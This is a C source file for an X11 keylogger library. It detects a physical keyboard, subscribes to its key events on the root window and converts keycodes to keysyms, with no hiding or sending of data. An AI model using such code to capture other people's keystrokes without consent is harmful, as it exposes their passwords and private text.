#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <X11/extensions/XInput.h>
#include <X11/extensions/XInput2.h>
#include <X11/XKBlib.h>

#include "xkeylogger.h"

typedef struct XKeylogger {
    Display* display;
} XKeylogger;

int detect_x_keyboard(Display* display) {
    int devices_number;
    XIDeviceInfo* devices = XIQueryDevice(
            display, XIAllDevices, &devices_number);
    int result = -1;
    int i;
    for (i = 0; i < devices_number; i++) {
        const char* name = devices[i].name;
        char* has_keyboard = strstr(name, "keyboard");
        char* has_Keyboard = strstr(name, "Keyboard");
        char* has_ACPI = strstr(name, "ACPI");
        char* has_Virtual = strstr(name, "Virtual");
        if ((has_keyboard || has_Keyboard) &&
                !has_ACPI && !has_Virtual) {
            result = devices[i].deviceid;
        }
    }
    XIFreeDeviceInfo(devices);
    return result;
}

// INVALID_EVENT_TYPE
static int key_press_type = -1;
static int key_release_type = -1;

int x_init(Display* display) {
    XEventClass event_list[7];
    int default_screen = DefaultScreen(display);
    int keyboard = detect_x_keyboard(display);
    XDevice* device = XOpenDevice(display, keyboard);
    if (!device) {
        //unable to open device
        return 0;
    }
    int number = 0;
    if (device->num_classes > 0) {
        int i;
        XInputClassInfo* ip = device->classes;
        for(i = 0; i < 1; ++ip, ++i) {
            switch (ip->input_class) {
            case KeyClass:
                DeviceKeyPress(device,
                        key_press_type,
                        event_list[number]);
                number++;
                DeviceKeyRelease(device,
                        key_release_type,
                        event_list[number]);
                number++;
                break;
            default:
                //not key class
                break;
            }
        }
    }
    Window root_window = RootWindow(display, default_screen);
    if (XSelectExtensionEvent(display, root_window,
                event_list, number)) {
        //error selecting extended events
        return 0;
    }
    return 1;
}

XKeylogger* initXKeylogger() {
    XKeylogger* logger = malloc(sizeof(XKeylogger));
    memset(logger, 0, sizeof(XKeylogger));
    // getenv returns 0 in case of error
    // and 0 is default display
    logger->display = XOpenDisplay(getenv("DISPLAY"));
    if (!logger->display || !x_init(logger->display)) {
        freeXKeylogger(logger);
        return 0;
    }
    return logger;
}

void freeXKeylogger(XKeylogger* logger) {
    if (logger) {
        if (logger->display) {
            XCloseDisplay(logger->display);
        }
        free(logger);
    }
}

int catchXKey(XKeylogger* logger) {
    Display* display = logger->display;
    XEvent e; XDeviceKeyEvent* key;
    XNextEvent(display, &e);
    key = (XDeviceKeyEvent *) &e;
    if (key->type == 79) {
        int state = (key->state >> 4) << 4;
        KeyCode keycode = key->keycode + state;
        unsigned int group = state ? 1 : 0;
        unsigned int level = key->state & ShiftMask ? 1 : 0;
        KeySym ks = XkbKeycodeToKeysym(display,
                keycode, group, level);
        if (ks == NoSymbol) {
            ks = XkbKeycodeToKeysym(display,
                    key->keycode, 0, level);
        }
        int ksint = (int)ks;
        return ksint;
    }
    return 0;
}
